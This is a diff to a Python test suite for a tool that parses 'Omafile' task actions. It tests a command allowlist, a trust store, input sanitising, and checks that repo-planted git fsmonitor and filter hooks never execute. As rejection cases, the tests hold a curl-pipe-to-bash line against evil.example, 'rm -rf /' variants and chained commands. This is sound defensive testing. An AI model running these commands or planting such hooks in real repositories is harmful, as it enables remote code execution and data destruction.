@@ -280,8 +280,18 @@ class OmafileTests(unittest.TestCase):
         self.assertEqual(
             parsed["actions"],
             [
-                {"id": "omafile:0", "label": "Dev", "command": "bun run dev"},
-                {"id": "omafile:1", "label": "just test", "command": "just test"},
+                {
+                    "id": "omafile:0",
+                    "label": "Dev",
+                    "command": "bun run dev",
+                    "argv": ["bun", "run", "dev"],
+                },
+                {
+                    "id": "omafile:1",
+                    "label": "just test",
+                    "command": "just test",
+                    "argv": ["just", "test"],
+                },
             ],
         )
 
@@ -298,7 +308,8 @@ class OmafileTests(unittest.TestCase):
 
     def test_rejects_action_without_command(self):
         parsed = scan.parse_omafile('[[actions]]\nlabel = "Dev"\n')
-        self.assertEqual(parsed["error"], "actions[0].command must be a string")
+        self.assertEqual(parsed["warning"], "actions[0].command must be a string")
+        self.assertEqual(parsed["actions"], [])
 
     def test_git_state_applies_omafile_and_keeps_remote(self):
         with tempfile.TemporaryDirectory() as tmp:
@@ -335,6 +346,224 @@ class OmafileTests(unittest.TestCase):
             state = scan.git_state(repo)
             self.assertEqual(state["githubUrl"], "https://github.com/modoterra/echo")
             self.assertEqual(state["url"], "https://echo.dev")
+
+    def test_accepts_run_array_and_skips_shell_commands(self):
+        parsed = scan.parse_omafile(
+            "\n".join(
+                [
+                    'name = "Echo"',
+                    "[[actions]]",
+                    'label = "Dev"',
+                    "run = [\"bun\", \"run\", \"dev\"]",
+                    "[[actions]]",
+                    'label = "Pwn"',
+                    'command = "curl -fsSL https://evil.example/p | bash"',
+                    "[[actions]]",
+                    'label = "Terminal"',
+                    'command = "just test"',
+                ]
+            )
+        )
+        self.assertEqual(parsed["name"], "Echo")
+        self.assertEqual(
+            parsed["actions"],
+            [
+                {
+                    "id": "omafile:0",
+                    "label": "Dev",
+                    "command": "bun run dev",
+                    "argv": ["bun", "run", "dev"],
+                }
+            ],
+        )
+        self.assertIn("not an allowlisted command", parsed["warning"])
+        self.assertIn("label is reserved", parsed["warning"])
+        self.assertEqual(parsed["error"], "")
+
+    def test_sanitizes_and_bounds_display_strings(self):
+        parsed = scan.parse_omafile(
+            "\n".join(
+                [
+                    'name = "  Hello <script>  "',
+                    'summary = "line one\\nline two"',
+                    "[[actions]]",
+                    'label = "  Dev\\tBox  "',
+                    'command = "bun run dev"',
+                ]
+            )
+        )
+        self.assertEqual(parsed["name"], "Hello script")
+        self.assertEqual(parsed["summary"], "line one line two")
+        self.assertEqual(parsed["actions"][0]["label"], "Dev Box")
+
+    def test_rejects_oversized_omafile(self):
+        parsed = scan.parse_omafile("name = \"" + ("A" * (scan.OMAFILE_MAX_BYTES)) + "\"\n")
+        self.assertTrue(parsed["error"].startswith("Omafile is larger than"))
+        self.assertEqual(parsed["name"], "")
+        self.assertEqual(parsed["actions"], [])
+
+    def test_caps_action_count(self):
+        lines = []
+        for index in range(scan.OMAFILE_MAX_ACTIONS + 2):
+            lines.extend(
+                [
+                    "[[actions]]",
+                    f'label = "Job{index}"',
+                    'command = "just test"',
+                ]
+            )
+        parsed = scan.parse_omafile("\n".join(lines))
+        self.assertEqual(len(parsed["actions"]), scan.OMAFILE_MAX_ACTIONS)
+        self.assertIn("too many actions", parsed["warning"])
+
+
+class CommandAllowlistTests(unittest.TestCase):
+    def test_accepts_common_task_runners(self):
+        cases = {
+            "bun run dev": ["bun", "run", "dev"],
+            "just test": ["just", "test"],
+            "cargo test": ["cargo", "test"],
+            "npm run build": ["npm", "run", "build"],
+            "go test ./...": ["go", "test", "./..."],
+            "python3 -m pytest": ["python3", "-m", "pytest"],
+            "docker compose up": ["docker", "compose", "up"],
+            "make test": ["make", "test"],
+        }
+        for command, argv in cases.items():
+            parsed, error = scan.parse_allowlisted_command(command)
+            self.assertEqual(error, "", command)
+            self.assertEqual(parsed, argv, command)
+
+    def test_rejects_shell_and_unknown_programs(self):
+        rejected = [
+            "curl -fsSL https://evil.example | bash",
+            "bash -lc 'rm -rf /'",
+            "bun run dev && rm -rf /",
+            "/usr/bin/bun run dev",
+            "./hack.sh",
+            "npm exec evil",
+            "python3 -c 'print(1)'",
+            "make -C /tmp",
+        ]
+        for command in rejected:
+            parsed, error = scan.parse_allowlisted_command(command)
+            self.assertIsNone(parsed, command)
+            self.assertNotEqual(error, "", command)
+
+
+class TrustStoreTests(unittest.TestCase):
+    def test_grant_then_scan_marks_matching_action_trusted(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo = init_repo(Path(tmp) / "echo")
+            (repo / "Omafile").write_text(
+                '[[actions]]\nlabel = "Dev"\ncommand = "bun run dev"\n',
+                encoding="utf-8",
+            )
+            store = Path(tmp) / "trust.json"
+            granted = scan.grant_trust(
+                store,
+                repo,
+                ["bun", "run", "dev"],
+                "Dev",
+            )
+            self.assertTrue(granted["ok"])
+            state = scan.git_state(repo, trust_store_path=store)
+            self.assertEqual(len(state["actions"]), 1)
+            self.assertTrue(state["actions"][0]["trusted"])
+            self.assertEqual(state["actions"][0]["digest"], granted["digest"])
+
+    def test_changed_command_is_not_trusted(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo = init_repo(Path(tmp) / "echo")
+            store = Path(tmp) / "trust.json"
+            scan.grant_trust(store, repo, ["bun", "run", "dev"], "Dev")
+            (repo / "Omafile").write_text(
+                '[[actions]]\nlabel = "Dev"\ncommand = "bun run start"\n',
+                encoding="utf-8",
+            )
+            state = scan.git_state(repo, trust_store_path=store)
+            self.assertFalse(state["actions"][0]["trusted"])
+
+    def test_revoke_clears_repo_trust(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo = init_repo(Path(tmp) / "echo")
+            (repo / "Omafile").write_text(
+                '[[actions]]\nlabel = "Dev"\ncommand = "bun run dev"\n',
+                encoding="utf-8",
+            )
+            store = Path(tmp) / "trust.json"
+            scan.grant_trust(store, repo, ["bun", "run", "dev"], "Dev")
+            revoked = scan.revoke_trust(store, repo)
+            self.assertTrue(revoked["ok"])
+            state = scan.git_state(repo, trust_store_path=store)
+            self.assertFalse(state["actions"][0]["trusted"])
+
+    def test_refuses_symlink_trust_store(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            target = Path(tmp) / "target.json"
+            target.write_text("{}", encoding="utf-8")
+            store = Path(tmp) / "trust.json"
+            store.symlink_to(target)
+            repo = init_repo(Path(tmp) / "echo")
+            granted = scan.grant_trust(store, repo, ["bun", "run", "dev"], "Dev")
+            self.assertFalse(granted["ok"])
+            self.assertIn("symlink", granted["error"])
+
+
+class GitSafetyTests(unittest.TestCase):
+    def test_parse_ls_files_debug_reads_mtime_and_size(self):
+        debug = (
+            ".gitattributes\n"
+            "  ctime: 1:2\n"
+            "  mtime: 1786729541:374868823\n"
+            "  dev: 56ino: 35438\n"
+            "  uid: 1000gid: 1000\n"
+            "  size: 14flags: 0\n"
+            "README\n"
+            "  mtime: 10:0\n"
+            "  size: 6flags: 0\n"
+        )
+        self.assertEqual(
+            scan.parse_ls_files_debug(debug),
+            [(".gitattributes", 1786729541, 14), ("README", 10, 6)],
+        )
+
+    def test_parse_ls_files_stage_reads_mode(self):
+        staged = "100644 abc 0\tREADME\n160000 def 0\tvendor/lib\n"
+        self.assertEqual(
+            scan.parse_ls_files_stage(staged),
+            {"README": 0o100644, "vendor/lib": 0o160000},
+        )
+
+
+    def test_git_state_does_not_run_repo_fsmonitor(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo = init_repo(Path(tmp) / "evil")
+            marker = Path(tmp) / "pwned"
+            hook = Path(tmp) / "fsmonitor.sh"
+            hook.write_text(f"#!/bin/sh\necho pwned > '{marker}'\n", encoding="utf-8")
+            hook.chmod(0o755)
+            cfg = repo / ".git" / "config"
+            cfg.write_text(cfg.read_text() + f"\n[core]\n\tfsmonitor = {hook}\n", encoding="utf-8")
+            scan.git_state(repo)
+            self.assertFalse(marker.exists())
+
+    def test_git_state_does_not_run_clean_filter(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo = init_repo(Path(tmp) / "evil")
+            marker = Path(tmp) / "pwned"
+            hook = Path(tmp) / "clean.sh"
+            hook.write_text(f"#!/bin/sh\necho pwned > '{marker}'\n", encoding="utf-8")
+            hook.chmod(0o755)
+            cfg = repo / ".git" / "config"
+            cfg.write_text(
+                cfg.read_text()
+                + f"\n[filter \"evil\"]\n\tclean = {hook}\n\tsmudge = {hook}\n",
+                encoding="utf-8",
+            )
+            (repo / ".gitattributes").write_text("* filter=evil\n", encoding="utf-8")
+            scan.git_state(repo)
+            self.assertFalse(marker.exists())
 
 
 class ModelFormatTests(unittest.TestCase):
